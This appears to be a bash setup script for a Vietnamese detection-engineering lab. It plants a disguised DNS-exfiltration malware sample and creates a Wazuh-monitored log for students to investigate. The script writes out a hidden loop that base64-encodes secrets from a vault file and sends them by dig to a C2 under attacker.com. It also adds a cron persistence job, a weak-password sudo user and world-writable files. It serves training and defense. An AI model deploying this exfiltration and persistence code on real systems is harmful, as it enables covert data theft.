#!/bin/bash
# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
# Gieo malware DNS-exfil (nguy trang) + luong DNS LANH TINH lam nhieu + log /var/log/dns-queries.log
# (Wazuh giam sat) cho detection engineering. Cong/EXID ca nhan hoa qua RAND_REPLACE (token EXID).
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }

# ===== 1) analyst cho DEFENDER SSH sang xu ly su co =====
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S usermod -aG sudo analyst 2>/dev/null

# ===== 2) File du lieu nhay cam (quyen 644 bi lo - SV phai khoa lai) =====
S mkdir -p /opt/company
# FLAG dung token SECRETVAL (KHAC EXID cua domain) -> SV phai GIAI MA base64 moi lay duoc,
# khong suy ra tu domain exfil-<EXID> hien o log.
S bash -c 'cat > /opt/company/secret_vault.txt <<EOF
FLAG_SECRET=PTIT_VAULT_SECRETVAL
CUSTOMER_CARD_1=4532-9981-2234-0012
CUSTOMER_CARD_2=5412-7765-8890-1123
API_PRIVATE_KEY=sk_live_998877665544332211_ptit
EOF'
S chmod 644 /opt/company/secret_vault.txt

# ===== 3) Log DNS (Wazuh giam sat) - world-writable de ca 2 luong ghi vao =====
S touch /var/log/dns-queries.log
S chmod 666 /var/log/dns-queries.log

# ===== 4) MA DOC: .dns_exfil.sh - doc vault, base64, tuon qua subdomain DNS toi C2 (.5), DON DAP =====
S bash -c 'cat > /usr/local/bin/.dns_exfil.sh <<'"'"'EOF'"'"'
#!/bin/bash
DNS_C2="172.20.0.5"
DOMAIN="exfil-EXID.attacker.com"
LOG="/var/log/dns-queries.log"
while true; do
  if [ -r /opt/company/secret_vault.txt ]; then
    while IFS= read -r line; do
      [ -z "$line" ] && continue
      B64=$(echo -n "$line" | base64 | tr -d "=\n")
      QUERY="${B64}.${DOMAIN}"
      echo "$(date "+%b %d %H:%M:%S") target dns-client[$$]: query[A] ${QUERY} from 172.20.0.10 to ${DNS_C2}" >> "$LOG"
      dig @"${DNS_C2}" "${QUERY}" +short +time=1 +tries=1 >/dev/null 2>&1 || true
      sleep 1
    done < /opt/company/secret_vault.txt
  fi
  sleep 6
done
EOF'
S chmod +x /usr/local/bin/.dns_exfil.sh

# ===== 5) PERSISTENCE ma doc: cron dns-sync tu khoi dong lai neu chua xoa =====
S bash -c 'cat > /etc/cron.d/dns-sync <<EOF
* * * * * ubuntu pgrep -f .dns_exfil.sh >/dev/null || nohup /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 &
EOF'
S chmod 644 /etc/cron.d/dns-sync

# ===== 6) LUONG LANH TINH (NHIEU NEN) - DNS he thong hop le, subdomain NGAN, toi DNS that .1 =====
#   KHONG phai ma doc -> ung pho KHONG duoc dong toi. Dung de do rule co bao gia (FP) hay khong.
S bash -c 'cat > /usr/local/bin/dns-legit.sh <<EOF
#!/bin/bash
LOG="/var/log/dns-queries.log"
DOMS=(update.ubuntu.com api.company-x.vn packages.wazuh.com pool.ntp.org security.debian.org)
while true; do
  d=\${DOMS[\$RANDOM % \${#DOMS[@]}]}
  echo "\$(date "+%b %d %H:%M:%S") target dns-client[\$\$]: query[A] \${d} from 172.20.0.10 to 172.20.0.1" >> "\$LOG"
  sleep \$((9 + RANDOM % 8))
done
EOF'
S chmod +x /usr/local/bin/dns-legit.sh
S bash -c 'cat > /etc/cron.d/dns-legit <<EOF
* * * * * ubuntu pgrep -f dns-legit.sh >/dev/null || nohup /bin/bash /usr/local/bin/dns-legit.sh >/dev/null 2>&1 &
EOF'
S chmod 644 /etc/cron.d/dns-legit

# ===== 7) Phieu dieu tra ~/findings.txt (5 IOC - SV tu tim + GIAI MA base64) =====
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA DNS EXFIL - dien gia tri TU TIM/GIAI MA (KEY=value):
# DNS_C2_IP    : IP may chu DNS ma nhan du lieu ro ri
# EXFIL_DOMAIN : ten mien goc lam duong ham (dang exfil-<so>.attacker.com)
# LEAKED_SECRET: gia tri FLAG_SECRET sau khi base64 -d chuoi subdomain doc trong log
# MAL_SCRIPT   : duong dan tuyet doi script ma doc exfil
# PERSIST_CRON : duong dan tep cron duy tri ma doc
DNS_C2_IP=
EXFIL_DOMAIN=
LEAKED_SECRET=
MAL_SCRIPT=
PERSIST_CRON=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

# ===== 8) Wazuh agent: giam sat /var/log/dns-queries.log (cho SV viet rule) =====
S bash -c 'grep -q "dns-queries.log" /var/ossec/etc/ossec.conf 2>/dev/null || cat >> /var/ossec/etc/ossec.conf <<EOF
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/dns-queries.log</location>
  </localfile>
</ossec_config>
EOF'
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# ===== 9) Khoi dong cron + ca 2 luong DNS =====
S systemctl restart cron 2>/dev/null || S service cron restart 2>/dev/null || true
setsid /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 < /dev/null &
setsid /bin/bash /usr/local/bin/dns-legit.sh >/dev/null 2>&1 < /dev/null &

exit 0
